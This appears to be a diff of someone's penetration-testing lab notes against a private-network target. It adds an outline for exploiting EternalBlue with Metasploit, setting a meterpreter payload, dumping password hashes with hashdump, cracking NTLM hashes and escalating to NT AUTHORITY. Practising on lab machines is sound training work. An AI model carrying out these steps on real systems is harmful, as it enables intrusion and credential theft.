@@ -79,7 +79,7 @@ nmap --script vuln --top-ports 1000 192.168.64.131
       Nmap done: 1 IP address (1 host up) scanned in 126.35 seconds
 
 
-##### TBC here onwards.
+##### TBC here onwards. #####
 
 Research all ports, along with the critical finding in scan number 2.
 
@@ -89,7 +89,20 @@ Searchsploit
 metasploit 
     search eternalblue confirms a number of packaged exploits ready to be used against target machine.
 
+look for auxiliary verison
+check if target ip is vulnerable
+
 use 3
-set payload
-rhost
+set payload to win7/tcp/meterpreter version
+rhost target ip
 run
+
+meterpreter shell access
+sysinfo
+hashdump
+
+crack ntml password
+conduct screenshot
+
+gain nt authority access
+
